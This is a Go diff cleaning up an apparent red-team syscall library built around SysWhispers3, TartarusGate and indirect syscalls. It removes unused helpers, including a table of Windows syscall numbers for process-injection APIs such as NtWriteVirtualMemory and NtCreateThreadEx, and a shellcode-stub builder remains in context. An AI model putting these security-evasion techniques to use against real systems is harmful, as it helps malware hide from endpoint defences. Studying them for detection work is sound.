@@ -234,8 +234,8 @@ func (sw *SysWhispers3) Execute(stub *SyscallStub, args ...uintptr) (uintptr, er
 }
 
 type IndirectSyscall struct {
-	mu          sync.Mutex  //nolint:staticcheck
-	lastRetAddr uintptr  //nolint:unused
+	mu sync.Mutex //nolint:staticcheck
+
 }
 
 func NewIndirectSyscall() *IndirectSyscall {
@@ -445,56 +445,7 @@ func CreateStub(name, module, function string, ssn uint16) *SyscallStub {
 		Module:   module,
 		Function: function,
 	}
-}  //nolint:staticcheck
-
-//nolint
-func getKnownSSN(function string) uint16 {  //nolint:staticcheck
-	knownSyscalls := map[string]uint16{
-		"NtAllocateVirtualMemory":   0x18,
-		"NtWriteVirtualMemory":      0x3A,
-		"NtProtectVirtualMemory":    0x50,
-		"NtCreateThreadEx":          0xC5,
-		"NtResumeThread":            0x4E,
-		"NtQueueApcThreadEx":        0xC6,
-		"NtOpenProcess":             0x26,
-		"NtQueryInformationProcess": 0x19,
-		"NtClose":                   0x0F,
-		"NtCreateSection":           0x4A,
-		"NtMapViewOfSection":        0x28,
-		"NtUnmapViewOfSection":      0x2A,
-	}
-	return knownSyscalls[function]
-}  //nolint:staticcheck
-
-//nolint
-func getSyscallStubAddr(function string) uintptr {  //nolint:staticcheck
-	ssn := getKnownSSN(function)
-	if ssn == 0 {
-		return 0
-	}
-
-	ntdllHandle, _ := loadLibrary("ntdll.dll")
-	if ntdllHandle == 0 {
-		return 0
-	}
-
-	procAddr, err := getProcAddress(ntdllHandle, function)
-	if err != nil {
-		return 0
-	}
-
-	return procAddr
-}  //nolint:staticcheck
-
-//nolint
-func loadLibrary(name string) (uintptr, error) {  //nolint:staticcheck
-	return loadLibraryImpl(name)
-}  //nolint:staticcheck
-
-//nolint
-func getProcAddress(handle uintptr, name string) (uintptr, error) {  //nolint:staticcheck
-	return getProcAddressImpl(handle, name)
-}
+} //nolint:staticcheck
 
 func newPlatformSyscall() SyscallExecutor {
 	return platformSyscallImpl
@@ -531,7 +482,6 @@ func platformSyscallImpl(addr uintptr, args ...uintptr) (uintptr, error) {
 	return ret, nil
 }
 
-//nolint:unused
 func (t *TartarusGate) buildSyscallPrologue(syscallNum uint32) []byte {
 	prologue := make([]byte, 16)
 	prologue[0] = 0x4C
@@ -539,7 +489,6 @@ func (t *TartarusGate) buildSyscallPrologue(syscallNum uint32) []byte {
 	return prologue
 }
 
-//nolint:unused
 func (sw *SysWhispers3) generateIndirectSyscallShellcode(stub *SyscallStub) []byte {
 	shellcode := make([]byte, 0, 16)
 	shellcode = append(shellcode, 0x4C)
